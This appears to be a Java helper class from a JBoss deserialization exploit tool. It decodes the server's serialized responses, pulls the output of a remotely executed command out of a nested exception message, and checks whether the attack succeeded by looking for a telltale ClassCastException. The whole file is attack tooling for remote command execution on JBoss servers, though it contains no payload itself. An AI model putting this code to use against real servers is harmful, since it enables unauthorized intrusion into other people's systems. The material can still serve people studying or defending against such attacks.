package serializeTools.exploit.jboss;

import org.jboss.invocation.InvocationException;
import org.jboss.invocation.MarshalledValue;

import java.io.*;

public class TrimCommandRes  {
	
	public String getCommandResult(byte[] Response)throws Exception {
		
		ByteArrayInputStream bfis = new ByteArrayInputStream(Response);
		ObjectInputStream ois = new ObjectInputStream(bfis);
		MarshalledValue mv = (MarshalledValue)ois.readObject();
		InvocationException ie = (InvocationException)mv.get();
		
		ie.getTargetException().getMessage().equals("sun.reflect.annotation.AnnotationInvocationHandler cannot be cast to org.jboss.invocation.MarshalledInvocation");
		String cmdResult = ie.getTargetException().getCause().getCause().getCause().getMessage();

		return cmdResult;
	}
	
	public boolean checkActionSuccess(byte[] Response) throws IOException, ClassNotFoundException {
		
		ByteArrayInputStream bfis = new ByteArrayInputStream(Response);
		ObjectInputStream ois = new ObjectInputStream(bfis);
		MarshalledValue mv = (MarshalledValue)ois.readObject();
		@SuppressWarnings("unused")
		InvocationException ie = (InvocationException)mv.get();
		
		if (new String(Response).indexOf("java.lang.ClassCastException") >= 0) {
			return true;
		}
		return false;
	}
	
	public Object getObject(byte[] Response) throws IOException, ClassNotFoundException{
		
		ByteArrayInputStream bfis = new ByteArrayInputStream(Response);
		ObjectInputStream ois = new ObjectInputStream(bfis);
		MarshalledValue mv = (MarshalledValue)ois.readObject();
		return mv;
	}

}
